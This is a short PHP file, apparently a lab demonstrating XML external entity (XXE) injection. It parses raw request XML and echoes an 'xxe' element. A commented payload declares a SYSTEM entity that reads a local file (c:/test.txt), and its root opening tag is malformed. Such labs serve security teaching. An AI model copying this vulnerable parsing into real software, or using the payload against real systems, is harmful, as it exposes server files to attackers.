<?php 
	//libxml_disable_entity_loader(false);
	$xmlfile = file_get_contents('php://input'); 
	$dom = new DOMDocument(); 
	$dom->loadXML($xmlfile); 
	$xml = simplexml_import_dom($dom); 
	print_r($xml);
	$xxe = $xml->xxe;
	$str = "$xxe \n";
	echo $str; 
	
	
	
	/*payload 
	<?xml version="1.0" encoding="utf-8"?>
	<!DOCTYPE a [
	<!ENTITY b SYSTEM "file:///c:/test.txt">
	]>
	xml>
	<xxe>&b;</xxe>
	</xml>
	*/
	
	
	
	
	
	
?>